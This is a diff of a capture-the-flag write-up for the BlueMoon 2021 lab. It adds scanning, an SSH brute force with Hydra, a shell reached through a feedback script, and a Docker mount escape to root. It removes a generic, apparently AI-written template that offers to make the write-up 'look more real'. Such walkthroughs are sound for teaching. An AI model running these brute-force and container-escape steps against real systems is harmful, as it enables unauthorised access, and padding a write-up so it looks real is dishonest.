@@ -24,13 +24,17 @@
 
 I used ifconfig to know the attacker's IP.
 
+```
 ifconfig
+```
 
 ## 🔍 Step 2 — Discover Target IP
 
 And then, identify the target machine on the network.
 
-sudo netdiscover  192.168.56.0/24
+```
+sudo netdiscover 
+```
 
 📌 Look for a new IP that is not your Kali machine.
 
@@ -44,8 +48,9 @@ Example result:
 
 Run a full scan to identify open ports and services.
 
+```
 nmap -sC -sV -Pn -vv 192.168.56.102
-
+```
 
 ### Example Findings:
 
@@ -57,7 +62,9 @@ nmap -sC -sV -Pn -vv 192.168.56.102
 
 I used gobuster to perform brute-forcing command to discover hidden paths on a web server.
 
+```
 gobuster dir --url http://ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 25 -x .txt, .php, .bak, .zip, .html
+```
 
 These are the directories that has been succesfully identified.
 
@@ -68,172 +75,206 @@ These are the directories that has been succesfully identified.
 - There is something off with the Thank You and after clicking it, I discovered a QR code.
 - Decoding the QR code revealed a FTP credentials for user and password.
 
+```
 user : user ftp passsword : fttp@ssword 
-
+```
 
 ## 🔑 Step 5 — FTP Access
 
-I
-## 🐚 Step 5 — Stabilize Shell
+### 🔐 Connecting to FTP
+
+I attempted to connect to the FTP service on the target machine:
+
+```
+ftp 192.168.56.102
+```
+---
+
+### 📄 Enumerating Files
+
+Once inside the FTP server, I listed the available files:
 
 ```bash
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-export TERM=xterm
+ls
+```
+
+The following files were found:
+
+```text
+information.txt
+p_lists.txt
+```
+
+These files looked interesting and potentially contained useful information such as credentials or hints.
+
+---
+
+### ⬇️ Downloading Files
+
+I downloaded both files to my local machine:
+
+```bash
+get information.txt
+get p_lists.txt
+```
+
+The transfer completed successfully.
+
+---
+
+### 🚪 Exiting FTP
+
+```bash
+exit
+```
+
+Read the contents of the files:
+
+```bash
+cat information.txt
+cat p_lists.txt
+```
+
+
+## 🔓 SSH Brute Force (Hydra)
+
+After obtaining a potential password list (`p_lists.txt`) from the FTP server, I used Hydra to perform a brute force attack on the SSH service.
+
+```
+hydra -l robin -P p_lists.txt 192.168.56.102 ssh
 ```
 
 ---
 
-## 🔎 Step 6 — Enumeration (Post-Exploitation)
+### 📌 Result
 
-Check:
+Hydra successfully discovered valid SSH credentials:
+
+```text
+[22][ssh] host: 192.168.56.102   login: robin   password: k4vr3ndh4nh4ck3r
+```
+
+This confirms that:
+- Username: `robin`
+- Password: `k4vr3ndh4nh4ck3r`
+
+### 🔐 Gaining Initial Access
+
+Using the discovered credentials, I logged into the target machine via SSH:
+
+```
+ssh robin@192.168.56.102
+```
+
+---
+
+## 📝 Executing feedback.sh
+
+During the enumeration phase, a script named `feedback.sh` was discovered. This script appears to collect user input and execute a shell.
+
+---
+
+### 🔍 Running the Script
+
+To execute the script:
+
+```
+./feedback.sh
+```
+
+---
+
+### 🧾 Interaction
+
+The script prompts for user input:
+
+Enter Your Name:
+Enter You FeedBack About This Target Machine:
+
+Example:
+
+Enter Your Name: zuzu
+Enter You FeedBack About This Target Machine: /bin/bash
+
+The script executes a shell, giving access to the system.
+
+```
+whoami
+```
+
+```text
+jerry
+```
+
+---
+
+### 🧠 User Information
 
 ```bash
-whoami
 id
-uname -a
 ```
 
-Look for:
+```text
+uid=1002(jerry) gid=1002(jerry) groups=1002(jerry),114(docker)
+```
 
-* SUID files
-* Writable files
-* Credentials
-
----
-
-### SUID Check
+### 🐳 Checking Available Docker Images
 
 ```bash
-find / -perm -4000 2>/dev/null
+docker images
+```
+
+```text
+REPOSITORY   TAG     IMAGE ID       CREATED        SIZE
+alpine       latest  28f6e2705743   5 years ago    5.61MB
 ```
 
 ---
 
-### Check for Credentials
+### 🚀 Exploiting Docker for Root Access
+
+I used Docker to mount the host filesystem and spawn a root shell:
 
 ```bash
-cat /etc/passwd
-cat /etc/shadow
-```
-
-Look in:
-
-```
-/var/www/
-/home/
+docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash
 ```
 
 ---
 
-## 🔼 Step 7 — Privilege Escalation
-
-### Check sudo permissions:
-
-```bash
-sudo -l
-```
-
-If something runs as root without password → exploit it.
-
----
-
-### Example Exploit (SUID Binary)
-
-If a vulnerable binary exists:
-
-```bash
-./binary
-```
-
-Or use GTFOBins:
-[https://gtfobins.github.io/](https://gtfobins.github.io/)
-
----
-
-### Cron Jobs
-
-```bash
-cat /etc/crontab
-```
-
-If writable script is executed → inject reverse shell.
-
----
-
-## 👑 Step 8 — Root Access
-
-Once escalated:
+### ✅ Root Access Achieved
 
 ```bash
 whoami
 ```
 
-Expected:
-
-```
+```text
 root
 ```
 
 ---
 
-## 🏁 Flags
+### 🏁 Capturing Root Flag
 
-Search for flags:
+Navigate to root directory:
 
 ```bash
-find / -name "*flag*" 2>/dev/null
+cd /root
+ls
 ```
 
-Common locations:
+```text
+root.txt
+```
 
-* `/root`
-* `/home/user`
+Read the flag:
 
----
+```bash
+cat root.txt
+```
 
-## 📌 Key Takeaways
-
-* Always enumerate thoroughly before exploiting
-* Web apps are common entry points
-* Misconfigured permissions → easy privilege escalation
-* SUID + sudo = privilege escalation goldmine
-
----
-
-## ⚠️ Notes
-
-* This machine focuses on:
-
-  * Web exploitation
-  * Basic enumeration
-  * Privilege escalation fundamentals
-
----
-
-## ✅ Tools Used
-
-* `netdiscover`
-* `nmap`
-* `gobuster`
-* `nc`
-* `python3`
-* `GTFOBins`
-
----
-
-## 🎯 Conclusion
-
-BlueMoon 2021 is a beginner-friendly machine that teaches:
-
-* Network discovery
-* Service enumeration
-* Web exploitation basics
-* Privilege escalation techniques
-
----
-
-Happy hacking 🚀
-
-If you want, I can customize this with the **exact commands/output from your machine** so your GitHub write-up looks more real and professional.
-
-
+```text
+Congratulations
+You Reached Root...!
+Root-Flag
+FLAG{r00t-H4ckTh3Pl4n3t0nc34g41n}
+```
